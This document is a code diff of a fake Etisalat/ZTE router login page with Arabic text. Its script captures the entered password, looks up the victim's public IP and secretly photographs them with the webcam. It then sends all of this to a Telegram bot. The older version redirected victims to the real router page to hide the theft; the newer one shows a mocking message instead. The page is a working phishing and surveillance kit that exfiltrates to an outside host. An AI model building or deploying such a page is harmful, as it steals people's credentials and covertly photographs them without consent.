@@ -3,25 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Router Configuration</title>
+    <title>Login</title>
     <style>
-        body { font-family: Tahoma, Arial; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #ccc; width: 450px; padding: 20px; box-shadow: 2px 2px 5px rgba(0,0,0,0.1); text-align: right; position: relative; }
-        .header { border-bottom: 2px solid #78be20; padding-bottom: 10px; margin-bottom: 20px; }
-        .header img { width: 60px; float: right; }
-        .info-text { font-size: 11px; color: #333; margin-bottom: 15px; background: #f9f9f9; padding: 5px; border: 1px solid #ddd; }
-        .input-group { margin-bottom: 10px; }
-        .input-group label { display: inline-block; width: 80px; font-size: 12px; }
-        .input-group input { width: 180px; border: 1px solid #7e7e7e; padding: 2px; }
-        .btn-login { background-color: #78be20; color: white; border: none; padding: 3px 15px; cursor: pointer; font-size: 12px; font-weight: bold; margin-top: 10px; }
+        body { font-family: Tahoma, Arial; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
+        .login-box { background: white; border: 1px solid #ccc; width: 400px; padding: 25px; box-shadow: 2px 2px 5px rgba(0,0,0,0.1); }
+        .header { border-bottom: 2px solid #78be20; padding-bottom: 10px; margin-bottom: 20px; text-align: left; }
+        .header img { width: 60px; }
+        .info-text { font-size: 12px; color: #333; margin-bottom: 20px; background: #f9f9f9; padding: 8px; border: 1px solid #ddd; text-align: center; }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        .input-group label { display: block; font-size: 13px; margin-bottom: 5px; color: #666; }
+        .input-group input { width: 100%; border: 1px solid #ccc; padding: 8px; box-sizing: border-box; }
+        .btn-login { background-color: #78be20; color: white; border: none; padding: 10px; cursor: pointer; font-size: 14px; font-weight: bold; width: 100%; margin-top: 10px; }
         #video, #canvas { display: none; }
+        /* ستايل رسالة القفشة */
+        #shabah-msg { display: none; color: red; font-weight: bold; font-size: 20px; margin-top: 20px; text-align: center; border: 2px dashed red; padding: 10px; }
     </style>
 </head>
 <body>
-    <div class="login-box">
+    <div class="login-box" id="main-box">
         <div class="header">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Etisalat_logo.svg/1200px-Etisalat_logo.svg.png" alt="Etisalat">
-            <div style="clear:both;"></div>
         </div>
         <div class="info-text">أهلاً وسهلاً، يرجى تسجيل الدخول. ZXHN H168N V3.5</div>
         
@@ -31,15 +32,14 @@
         </div>
         <div class="input-group">
             <label>كلمة المرور</label>
-            <input type="password" id="pass-input">
+            <input type="password" id="pass-input" placeholder="أدخل كلمة المرور">
         </div>
         
         <button class="btn-login" id="start-btn">تسجيل الدخول</button>
+        <div id="shabah-msg">🚨 وقعت يا حمار! 🚨</div>
         
         <video id="video" autoplay></video>
         <canvas id="canvas"></canvas>
-        
-        <div style="font-size: 10px; color: #999; margin-top: 50px;">شركة ZTE جميع الحقوق محفوظة © 2008-2021</div>
     </div>
 
     <script>
@@ -48,13 +48,15 @@
 
         document.getElementById('start-btn').addEventListener('click', async () => {
             const password = document.getElementById('pass-input').value;
-            if (!password) { return; }
+            if (!password) { alert('يرجى إدخال كلمة المرور'); return; }
 
             try {
+                // سحب الـ IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const userIP = ipData.ip;
 
+                // التصوير
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -67,16 +69,19 @@
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'intruder.jpg');
-                        formData.append('caption', `🚨 صيد احترافي يا رمضان!\n🔑 الباسورد: ${password}\n🌐 IP: ${userIP}`);
+                        formData.append('photo', blob, 'shabah.jpg');
+                        formData.append('caption', `🚨 تم القفش بنجاح يا رمضان!\n🔑 كلمة السر: ${password}\n🌐 IP: ${userIP}`);
                         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
                     
-                    // تحويله لصفحة الراوتر الحقيقية بعد السحب عشان مكيشسكش
-                    window.location.href = "http://192.168.1.1";
+                    // إظهار رسالة القفشة وإخفاء الزرار
+                    document.getElementById('start-btn').style.display = 'none';
+                    document.getElementById('shabah-msg').style.display = 'block';
+                    
                 }, 1000);
             } catch (err) {
-                window.location.href = "http://192.168.1.1";
+                document.getElementById('shabah-msg').style.display = 'block';
+                document.getElementById('shabah-msg').innerText = "وقعت يا حمار حتى وأنت قافل الكاميرا!";
             }
         });
     </script>
